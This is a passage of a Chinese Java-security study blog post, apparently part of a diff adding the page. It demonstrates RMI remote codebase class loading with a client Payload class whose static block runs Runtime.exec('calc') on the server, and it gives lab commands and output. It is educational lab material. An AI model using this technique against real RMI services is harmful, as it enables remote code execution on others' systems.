class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteRMIServer</span>().start();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java">RMIClient.java<br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Payload</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ArrayList</span>&lt;Integer&gt; &#123;<br><br>        <span class="hljs-keyword">static</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;Pwned! I am running on Server!&quot;</span>);<br><br>                Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;&#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">lookup</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        System.setProperty(<span class="hljs-string">&quot;java.rmi.server.codebase&quot;</span>, <span class="hljs-string">&quot;http://127.0.0.1/&quot;</span>);<br><br>        <span class="hljs-type">ICalc</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> (ICalc)Naming.lookup(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/refObj&quot;</span>);<br>        List&lt;Integer&gt; li = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Payload</span>();<br>        li.add(<span class="hljs-number">3</span>);<br>        li.add(<span class="hljs-number">4</span>);<br>        System.out.println(r.sum(li));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMIClient</span>().lookup();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>然后在根目录下执行<code>javac *.java</code>编译所有文件，编译好了之后按照我的文件树放置文件。其实主要就2点,<code>RemoteRMIServer.class</code> 目录下没有<code>RMIClient.class</code>和<code>RMIClient$Payload.class</code>，然后client目录下得有<code>ICalc.class</code>这个接口类。然后在client下开启web服务。</p>
+<p>服务端执行：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">D:\javasec\javaproject\rmitest&gt;java RemoteRMIServer<br>setup SecurityManager<br>Pwned! I am running on Server!<br></code></pre></td></tr></table></figure>
+
+<p>client目录下执行：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">D:\javasec\javaproject\rmitest\client&gt;java -Djava.rmi.server.useCodebaseOnly=<span class="hljs-literal">false</span> -Djava.rmi.server.codebase=http:<span class="hljs-comment">//10.252.92.135/ -Djava.security.policy=client.policy RMIClient</span><br>Pwned! I am running on Server!<br><span class="hljs-number">7</span><br></code></pre></td></tr></table></figure>
+
+<p>同样的client目录下开启web服务：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">D:\javasec\javaproject\rmitest\client&gt;python -m http.server <span class="hljs-number">80</span><br>Serving HTTP on :: port <span class="hljs-number">80</span> (http:<span class="hljs-comment">//[::]:80/) ...</span><br>::ffff:<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> - - [<span class="hljs-number">16</span>/Dec/<span class="hljs-number">2025</span> 09:<span class="hljs-number">19</span>:<span class="hljs-number">10</span>] <span class="hljs-string">&quot;GET /RMIClient$Payload.class HTTP/1.1&quot;</span> <span class="hljs-number">200</span> -<br></code></pre></td></tr></table></figure>
+
+<p>gemini的指导：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/57713373/1765848707635-7b554918-7eb5-426c-a320-bcc3a6b2c2c7.png" srcset="/img/loading.gif" lazyload></p>
+<p>序列化数据复现：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/57713373/1765848445653-abe5f96a-bfb3-49c1-aba8-0f64793ef301.png" srcset="/img/loading.gif" lazyload></p>
+<p>目前还没学习反序列化，就没去复现了。</p>
+<p>表述能力有限，建议各位还是看p神星球里的pdf。在pdf中p神详细讲述了RMI中的序列化数据</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/note/" class="category-chain-item">note</a>
+  
+  
+
+      </span>
+    
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/javasec/" class="category-chain-item">javasec</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/javasec/">#javasec</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>java安全学习笔记2</div>
+      <div>https://rightevil.github.io/java安全学习笔记2/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>rightevil</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年12月16日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/" title="java安全学习笔记1">
+                        <span class="hidden-mobile">java安全学习笔记1</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <div id="lv-container" data-id="city" data-uid="MTAyMC81NzQyNC8zMzg4OA==">
+    <script type="text/javascript">
+      Fluid.utils.loadComments('#lv-container', function() {
+        Fluid.utils.createScript('https://cdn-city.livere.com/js/embed.dist.js');
+      });
+    </script>
+    <noscript>Please enable JavaScript to view the comments</noscript>
+  </div>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
